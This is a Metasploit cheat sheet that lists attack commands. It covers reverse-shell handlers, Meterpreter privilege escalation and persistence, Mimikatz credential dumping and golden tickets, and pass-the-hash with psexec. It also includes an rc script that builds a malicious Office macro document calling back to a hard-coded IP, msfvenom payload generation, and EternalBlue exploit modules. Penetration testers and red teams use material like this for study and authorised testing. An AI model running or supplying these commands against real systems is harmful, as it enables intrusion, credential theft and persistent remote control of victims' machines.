# Metasploit

## Installation

```powershell
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
```

or docker

```powershell
sudo docker run --rm -it -p 443:443 -v ~/.msf4:/root/.msf4 -v /tmp/msf:/tmp/data remnux/metasploit
```

## Sessions

```powershell
CTRL+Z   -> Session in Background
sessions -> List sessions
sessions -i session_number -> Interact with Session with id
sessions -u session_number -> Upgrade session to a meterpreter
sessions -u session_number LPORT=4444 PAYLOAD_OVERRIDE=meterpreter/reverse_tcp HANDLER=false-> Upgrade session to a meterpreter

sessions -c cmd           -> Execute a command on several sessions
sessions -i 10-20 -c "id" -> Execute a command on several sessions
```

## Multi/handler in background (screen/tmux)

ExitOnSession : the handler will not exit if the meterpreter dies.

```powershell
screen -dRR
sudo msfconsole

use exploit/multi/handler
set PAYLOAD generic/shell_reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
exploit -j

[ctrl+a] + [d]
```

## Meterpreter - Basic

### SYSTEM / Administrator privilege

```powershell
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### Persistence Startup

```powershell
OPTIONS:

-A        Automatically start a matching exploit/multi/handler to connect to the agent
-L <opt>  Location in target host to write payload to, if none %TEMP% will be used.
-P <opt>  Payload to use, default is windows/meterpreter/reverse_tcp.
-S        Automatically start the agent on boot as a service (with SYSTEM privileges)
-T <opt>  Alternate executable template to use
-U        Automatically start the agent when the User logs on
-X        Automatically start the agent when the system boots
-h        This help menu
-i <opt>  The interval in seconds between each connection attempt
-p <opt>  The port on which the system running Metasploit is listening
-r <opt>  The IP of the system running Metasploit listening for the connect back

meterpreter > run persistence -U -p 4242
```

### Portforward

```powershell
portfwd add -l 7777 -r 172.17.0.2 -p 3006
```

### Upload / Download

```powershell
upload /path/in/hdd/payload.exe exploit.exe
download /path/in/victim
```

### Execute from Memory

```powershell
execute -H -i -c -m -d calc.exe -f /root/wce.exe -a  -w
```

### Mimikatz

```powershell
load mimikatz
mimikatz_command -f version
mimikatz_command -f samdump::hashes
mimikatz_command -f sekurlsa::searchPasswords
```

```powershell
load kiwi
golden_ticket_create -d <domainname> -k <nthashof krbtgt> -s <SID without le RID> -u <user_for_the_ticket> -t <location_to_store_tck>
```

### Pass the Hash - PSExec

```powershell
msf > use exploit/windows/smb/psexec
msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
msf exploit(psexec) > exploit
SMBDomain             WORKGROUP                                                          no        The Windows domain to use for authentication
SMBPass               598ddce2660d3193aad3b435b51404ee:2d20d252a479f485cdf5e171d93985bf  no        The password for the specified username
SMBUser               Lambda                                                             no        The username to authenticate as
```

## Scripting Metasploit

Using a `.rc file`, write the commands to execute, then run `msfconsole -r ./file.rc`.
Here is a simple example to script the deployment of a handler an create an Office doc with macro.

```powershell
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 4646
set ExitOnSession false
exploit -j -z


use exploit/multi/fileformat/office_word_macro 
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 159.65.52.124
set LPORT 4646
exploit
```

## Multiple transports

```powershell
msfvenom -p windows/meterpreter_reverse_tcp lhost=<host> lport=<port> sessionretrytotal=30 sessionretrywait=10 extensions=stdapi,priv,powershell extinit=powershell,/home/ionize/AddTransports.ps1 -f exe
```

Then, in AddTransports.ps1

```powershell
Add-TcpTransport -lhost <host> -lport <port> -RetryWait 10 -RetryTotal 30
Add-WebTransport -Url http(s)://<host>:<port>/<luri> -RetryWait 10 -RetryTotal 30
```

## Best of - Exploits

* MS17-10 Eternal Blue - `exploit/windows/smb/ms17_010_eternalblue`
* MS08_67 - `exploit/windows/smb/ms08_067_netapi`

## Thanks to

* [Multiple transports in a meterpreter payload - ionize](https://ionize.com.au/multiple-transports-in-a-meterpreter-payload/)
